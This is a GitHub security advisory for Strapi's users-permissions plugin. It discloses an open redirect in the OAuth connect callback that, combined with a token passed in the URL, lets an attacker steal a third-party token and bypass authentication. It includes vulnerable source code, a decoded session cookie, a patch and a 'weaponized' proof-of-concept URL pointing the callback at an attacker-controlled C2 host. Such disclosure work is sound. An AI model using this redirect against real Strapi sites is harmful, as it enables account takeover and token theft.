=== Content from github.com_2da03957_20250110_194244.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstrapi%2Fstrapi%2Fsecurity%2Fadvisories%2FGHSA-wrvh-rcmr-9qfc)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstrapi%2Fstrapi%2Fsecurity%2Fadvisories%2FGHSA-wrvh-rcmr-9qfc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=strapi%2Fstrapi)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[strapi](/strapi)
/
**[strapi](/strapi/strapi)**
Public

* [Notifications](/login?return_to=%2Fstrapi%2Fstrapi) You must be signed in to change notification settings
* [Fork
  8.3k](/login?return_to=%2Fstrapi%2Fstrapi)
* [Star
   64.6k](/login?return_to=%2Fstrapi%2Fstrapi)

* [Code](/strapi/strapi)
* [Issues
  822](/strapi/strapi/issues)
* [Pull requests
  80](/strapi/strapi/pulls)
* [Actions](/strapi/strapi/actions)
* [Projects
  6](/strapi/strapi/projects)
* [Security](/strapi/strapi/security)
* [Insights](/strapi/strapi/pulse)

Additional navigation options

* [Code](/strapi/strapi)
* [Issues](/strapi/strapi/issues)
* [Pull requests](/strapi/strapi/pulls)
* [Actions](/strapi/strapi/actions)
* [Projects](/strapi/strapi/projects)
* [Security](/strapi/strapi/security)
* [Insights](/strapi/strapi/pulse)

# 3rd party token leak and authentication bypass

High

[derrickmehaffy](/derrickmehaffy)
published
GHSA-wrvh-rcmr-9qfc
Jun 12, 2024

## Package

npm

@strapi/plugin-users-permissions
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<= 4.24.1

## Patched versions

4.24.2

## Description

Our report includes two vulnerabilities that we deemed appropriate to report together as the combined effect of leveraging both is higher than what it would appear if you triage each separately. Feel free to break up this report in two, if you think it is pertinent.

These vulnerabilities were found while performing an audit of a customer's application that used Strapi.

The technical details, screenshots, PoC code and suggestions for possible fixes are below.

### Summary

By combining two vulnerabilities (an `Open Redirect` and `session token sent as URL query parameter`) in Strapi framework is its possible of an unauthenticated attacker to bypass authentication mechanisms and retrieve the 3rd party tokens. The attack requires user interaction (one click).

### Impact

Unauthenticated attackers can leverage two vulnerabilities to obtain an 3rd party token and the bypass authentication of Strapi apps.

### Technical details

#### Vulnerability 1: Open Redirect

##### Description

Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.

In the specific context of Strapi, this vulnerability allows the SSO token to be stolen, allowing an attacker to authenticate himself within the application.

##### Remediation

If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:

* Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.
* Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.

If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:

* The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.
* The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend <http://yourdomainname.com> to the URL before issuing the redirect.

###### Example 1: Open Redirect in /api/connect/microsoft via `$_GET["callback"]`

* Path: /api/connect/microsoft
* Parameter: `$_GET["callback"]`

Payload:

```
https://google.fr/

```

Final payload:

```
https://<TARGET>/api/connect/microsoft?callback=https://google.fr/

```

User clicks on the link:

[![c1](https://private-user-images.githubusercontent.com/30262080/305534571-c1944cf8-2ef0-4214-ba9e-d4aad10d85ba.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NzEtYzE5NDRjZjgtMmVmMC00MjE0LWJhOWUtZDRhYWQxMGQ4NWJhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTAyNDg5NmY5MWJkNTczZDgxMTNjZjkyZjU3ZTk0Zjc0MjRjZDQwNDdkOWFiZWRiMDk3ZGYzOTQ2Nzk4NDgzNDEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gsxN_-N_nN0WB9ntkt8o7gAwwPij6zhIBZ7KqM9HRL8)](https://private-user-images.githubusercontent.com/30262080/305534571-c1944cf8-2ef0-4214-ba9e-d4aad10d85ba.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NzEtYzE5NDRjZjgtMmVmMC00MjE0LWJhOWUtZDRhYWQxMGQ4NWJhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTAyNDg5NmY5MWJkNTczZDgxMTNjZjkyZjU3ZTk0Zjc0MjRjZDQwNDdkOWFiZWRiMDk3ZGYzOTQ2Nzk4NDgzNDEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gsxN_-N_nN0WB9ntkt8o7gAwwPij6zhIBZ7KqM9HRL8)

We look at the intercepted request in Burp and we see that we are redirected to Microsoft:

[![c0](https://private-user-images.githubusercontent.com/30262080/305534569-0c3d9289-432c-46ac-a7e3-eafe15f02483.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjktMGMzZDkyODktNDMyYy00NmFjLWE3ZTMtZWFmZTE1ZjAyNDgzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY3MTVkOTgyNmZjODlkY2M3NWU2NWQ1NGE1NDU4NGE3NzIzNTNhN2Y2MDczNWY4YzE4YjBjYmUyYzBiNTJmM2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Akf7CExq3NpIiJttXxLIHyPOneqtyxzaASkgfIfZ9_0)](https://private-user-images.githubusercontent.com/30262080/305534569-0c3d9289-432c-46ac-a7e3-eafe15f02483.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjktMGMzZDkyODktNDMyYy00NmFjLWE3ZTMtZWFmZTE1ZjAyNDgzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY3MTVkOTgyNmZjODlkY2M3NWU2NWQ1NGE1NDU4NGE3NzIzNTNhN2Y2MDczNWY4YzE4YjBjYmUyYzBiNTJmM2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Akf7CExq3NpIiJttXxLIHyPOneqtyxzaASkgfIfZ9_0)

Microsoft check our cookies and redirects us to the original domain (and route) but with different GET parameters.

Then, the page redirects us to the domain we control (and a token is added to controlled the URL):

[![c2](https://private-user-images.githubusercontent.com/30262080/305534565-009e3898-1ccf-4ee4-9c29-496ff6b302d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjUtMDA5ZTM4OTgtMWNjZi00ZWU0LTljMjktNDk2ZmY2YjMwMmQwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY2MTBlZmQ0NDU2NTgyYzJkOWY4MTI1NDFhN2Q2YjMzNzJiYTAxMTYyM2E1ZDRiOTk5ZGQzZmZmYmM0NDRmOTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mAPg9B5xm0FMxWDRy1INjvSFKkdcZQNtPhqbNufwqsM)](https://private-user-images.githubusercontent.com/30262080/305534565-009e3898-1ccf-4ee4-9c29-496ff6b302d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjUtMDA5ZTM4OTgtMWNjZi00ZWU0LTljMjktNDk2ZmY2YjMwMmQwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY2MTBlZmQ0NDU2NTgyYzJkOWY4MTI1NDFhN2Q2YjMzNzJiYTAxMTYyM2E1ZDRiOTk5ZGQzZmZmYmM0NDRmOTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mAPg9B5xm0FMxWDRy1INjvSFKkdcZQNtPhqbNufwqsM)

We realize that the domain we originally specified (<https://google.fr>) as `$_GET["callback"]` parameter is present in the cookies. So, I guess, <TARGET> is using the cookies (`koa.sess`) to redirect us.

[![c3](https://private-user-images.githubusercontent.com/30262080/305534561-4c25cb6c-c9e8-4c2d-aa61-1ad1442e5f4d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjEtNGMyNWNiNmMtYzllOC00YzJkLWFhNjEtMWFkMTQ0MmU1ZjRkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJjYzE5OWMwZTZkZWQ4YmI4Njc1NTdlY2MxMTkwMjUwOTI3YTc3Y2MyZjAyMjliOWM3NTExZjU3ZDk2MDc2NmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.T_kbg8uuEj7bt_1GuBTth2s8dvh6Q869LCkVa0nka2w)](https://private-user-images.githubusercontent.com/30262080/305534561-4c25cb6c-c9e8-4c2d-aa61-1ad1442e5f4d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NjEtNGMyNWNiNmMtYzllOC00YzJkLWFhNjEtMWFkMTQ0MmU1ZjRkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJjYzE5OWMwZTZkZWQ4YmI4Njc1NTdlY2MxMTkwMjUwOTI3YTc3Y2MyZjAyMjliOWM3NTExZjU3ZDk2MDc2NmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.T_kbg8uuEj7bt_1GuBTth2s8dvh6Q869LCkVa0nka2w)

`koa.sess` cookie:

```
eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2dvb2dsZS5mci8ifX0sIl9leHBpcmUiOjE3MDAyMzQyNDQyNjMsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==

```

```
{"grant":{"provider":"microsoft","dynamic":{"callback":"https://google.fr/"}},"_expire":1700234244263,"_maxAge":86400000}
```

The vulnerability seems to come from the application's core:

File: [packages/plugins/users-permissions/server/controllers/auth.js](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/controllers/auth.js)

```
'use strict';

/**
 * Auth.js controller
 *
 * @description: A set of functions called "actions" for managing `Auth`.
 */

/* eslint-disable no-useless-escape */
const crypto = require('crypto');
const _ = require('lodash');
const { concat, compact, isArray } = require('lodash/fp');
const utils = require('@strapi/utils');
const {
  contentTypes: { getNonWritableAttributes },
} = require('@strapi/utils');
const { getService } = require('../utils');
const {
  validateCallbackBody,
  validateRegisterBody,
  validateSendEmailConfirmationBody,
  validateForgotPasswordBody,
  validateResetPasswordBody,
  validateEmailConfirmationBody,
  validateChangePasswordBody,
} = require('./validation/auth');

const { getAbsoluteAdminUrl, getAbsoluteServerUrl, sanitize } = utils;
const { ApplicationError, ValidationError, ForbiddenError } = utils.errors;

const sanitizeUser = (user, ctx) => {
  const { auth } = ctx.state;
  const userSchema = strapi.getModel('plugin::users-permissions.user');

  return sanitize.contentAPI.output(user, userSchema, { auth });
};

module.exports = {
  async callback(ctx) {
    const provider = ctx.params.provider || 'local';
    const params = ctx.request.body;

    const store = strapi.store({ type: 'plugin', name: 'users-permissions' });
    const grantSettings = await store.get({ key: 'grant' });

    const grantProvider = provider === 'local' ? 'email' : provider;

    if (!_.get(grantSettings, [grantProvider, 'enabled'])) {
      throw new ApplicationError('This provider is disabled');
    }

    if (provider === 'local') {
      await validateCallbackBody(params);

      const { identifier } = params;

      // Check if the user exists.
      const user = await strapi.query('plugin::users-permissions.user').findOne({
        where: {
          provider,
          $or: [{ email: identifier.toLowerCase() }, { username: identifier }],
        },
      });

      if (!user) {
        throw new ValidationError('Invalid identifier or password');
      }

      if (!user.password) {
        throw new ValidationError('Invalid identifier or password');
      }

      const validPassword = await getService('user').validatePassword(
        params.password,
        user.password
      );

      if (!validPassword) {
        throw new ValidationError('Invalid identifier or password');
      }

      const advancedSettings = await store.get({ key: 'advanced' });
      const requiresConfirmation = _.get(advancedSettings, 'email_confirmation');

      if (requiresConfirmation && user.confirmed !== true) {
        throw new ApplicationError('Your account email is not confirmed');
      }

      if (user.blocked === true) {
        throw new ApplicationError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    }

    // Connect the user with the third-party provider.
    try {
      const user = await getService('providers').connect(provider, ctx.query);

      if (user.blocked) {
        throw new ForbiddenError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    } catch (error) {
      throw new ApplicationError(error.message);
    }
  },

  //...

  async connect(ctx, next) {
    const grant = require('grant-koa');

    const providers = await strapi
      .store({ type: 'plugin', name: 'users-permissions', key: 'grant' })
      .get();

    const apiPrefix = strapi.config.get('api.rest.prefix');
    const grantConfig = {
      defaults: {
        prefix: `${apiPrefix}/connect`,
      },
      ...providers,
    };

    const [requestPath] = ctx.request.url.split('?');
    const provider = requestPath.split('/connect/')[1].split('/')[0];

    if (!_.get(grantConfig[provider], 'enabled')) {
      throw new ApplicationError('This provider is disabled');
    }

    if (!strapi.config.server.url.startsWith('http')) {
      strapi.log.warn(
        'You are using a third party provider for login. Make sure to set an absolute url in config/server.js. More info here: https://docs.strapi.io/developer-docs/latest/plugins/users-permissions.html#setting-up-the-server-url'
      );
    }

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
  },

  //...

};
```

And more specifically:

```
...

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
...
```

Possible patch:

```
grantConfig[provider].callback = process.env[`${provider.toUpperCase()}_REDIRECT_URL`] || grantConfig[provider].callback
```

`_.get(ctx, 'query.callback')` = `$_GET["callback"]` and `_.get(ctx, 'session')` = `$_COOKIE["koa.sess"]` (which is `{"grant":{"provider":"microsoft","dynamic":{"callback":"https://XXXXXXX/"}},"_expire":1701275652123,"_maxAge":86400000}`) so `_.get(ctx, 'session.grant.dynamic.callback')` = `https://XXXXXXX/`.

The route is clearly defined here:

File: [packages/plugins/users-permissions/server/routes/content-api/auth.js](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/routes/content-api/auth.js)

```
'use strict';

module.exports = [

//...

  {
    method: 'GET',
    path: '/auth/:provider/callback',
    handler: 'auth.callback',
    config: {
      prefix: '',
    },
  },

  //...

];
```

File: [packages/plugins/users-permissions/server/services/providers-registry.js](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/services/providers-registry.js)

```
const getInitialProviders = ({ purest }) => ({

//..

  async microsoft({ accessToken }) {
    const microsoft = purest({ provider: 'microsoft' });

    return microsoft
      .get('me')
      .auth(accessToken)
      .request()
      .then(({ body }) => ({
        username: body.userPrincipalName,
        email: body.userPrincipalName,
      }));
  },

//..

});
```

If parameter `$_GET["callback"]` is defined in the GET request, the assignment does not evaluate all conditions, but stops at the beginning. The value is then stored in the cookie `koa.sess`:

`koa.sess`=`eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2FkbWluLmludGUubmV0YXRtby5jb20vdXNlcnMvYXV0aC9yZWRpcmVjdCJ9fSwiX2V4cGlyZSI6MTcwMTI3NTY1MjEyMywiX21heEFnZSI6ODY0MDAwMDB9`

Which once base64 decoded become `{"grant":{"provider":"microsoft","dynamic":{"callback":"https://<TARGET>/users/auth/redirect"}},"_expire":1701275652123,"_maxAge":86400000}`.

The signature of the cookie is stored in cookie `koa.sess.sig`:

`koa.sess.sig`=`wTRmcVRrn88hWMdg84VvSD87-_0`

File: [packages/plugins/users-permissions/server/bootstrap/grant-config.js](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/bootstrap/grant-config.js)

```
//..

  microsoft: {
    enabled: false,
    icon: 'windows',
    key: '',
    secret: '',
    callback: `${baseURL}/microsoft/callback`,
    scope: ['user.read'],
  },

//..
```
#### Vulnerability 2: Session token in URL

##### Description

Applications should not send session tokens as URL query parameters and use instead an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.

###### Example 1: SSO token transmitted within URL (`$_GET["access_token"]`)

* Path: /api/connect/microsoft
* Parameter: `$_GET["callback"]`

We realized that when a callback was called, the 3rd party token was transmitted in an insecure way within the URL, which could be used to increase the impact of the Open Redirect vulnerability described previously by stealing the SSO token.

Weaponized payload:

```
https://<TARGET>/api/connect/microsoft?callback=http://<C2>:8080/

```

With a web server specially developed to exploit the vulnerability listening on <C2>:8080, we show that it is possible to retrieve a JWT token allowing authentication on Strapi.

A user is on his browser when he decides to click on a link sent to him by e-mail.

[![c4](https://private-user-images.githubusercontent.com/30262080/305534557-c6e22fa1-14a4-4c76-a832-d07305f265b6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NTctYzZlMjJmYTEtMTRhNC00Yzc2LWE4MzItZDA3MzA1ZjI2NWI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY4YTAxMjk5Nzg0NjJiNzg2NDlmMmI4MjViYmNhMzExZTUyMzg3ODNlZWNkYWYxYzkxYThmMzJlMTNkNzZjYTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.phnYUIZCNJAobl2BykdaZLxOYPh67GZxcJZk926lj_Q)](https://private-user-images.githubusercontent.com/30262080/305534557-c6e22fa1-14a4-4c76-a832-d07305f265b6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1Mzg0NjQsIm5iZiI6MTczNjUzODE2NCwicGF0aCI6Ii8zMDI2MjA4MC8zMDU1MzQ1NTctYzZlMjJmYTEtMTRhNC00Yzc2LWE4MzItZDA3MzA1ZjI2NWI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE5NDI0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY4YTAxMjk5Nzg0NjJiNzg2NDlmMmI4MjViYmNhMzExZTUyMzg3ODNlZWNkYWYxYzkxYThmMzJlMTNkNzZjYTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.phnYUIZCNJAobl2BykdaZLxOYPh67GZxcJZk926lj_Q)

> The attacker places the malicious link in the URL bar to simulate a victim's click.

